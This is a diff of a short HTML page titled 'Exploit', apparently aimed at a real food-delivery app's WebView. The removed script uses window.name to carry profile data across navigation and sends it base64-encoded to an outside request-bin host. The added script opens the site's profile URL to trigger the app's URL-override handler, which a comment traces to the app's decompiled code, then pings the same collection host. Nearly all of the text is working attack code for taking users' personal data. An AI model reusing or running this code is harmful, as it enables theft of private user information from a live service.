@@ -1,12 +1,23 @@
-<script>
-    if (window.name === "" || window.name === "init") {
-        // Step 1: Set the name and jump to the PII page
-        window.name = "waiting_for_data";
-        window.location.href = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
-    } else {
-        // Step 3: We have returned from abc.com!
-        // We check if the PII leaked into the name or if we can fetch it now.
-        fetch('https://eomfuajl79ed6za.m.pipedream.net/?data_found=' + btoa(window.name));
-        document.body.innerHTML = "<h1>Data Captured Check Bin</h1>";
-    }
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        // We attempt to "load" the PII as if it were a script or an image.
+        // The Smali code says the app will intercept this request and 
+        // call loadUrl() on it.
+        const piiUrl = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
+        
+        // This triggers shouldOverrideUrlLoading
+        window.location.href = piiUrl;
+
+        // Immediately try to "catch" the data if the app's internal 
+        // state allows a transition.
+        setTimeout(() => {
+            fetch('https://eomfuajl79ed6za.m.pipedream.net/?status=triggered');
+        }, 1000);
+    </script>
+</body>
+</html>
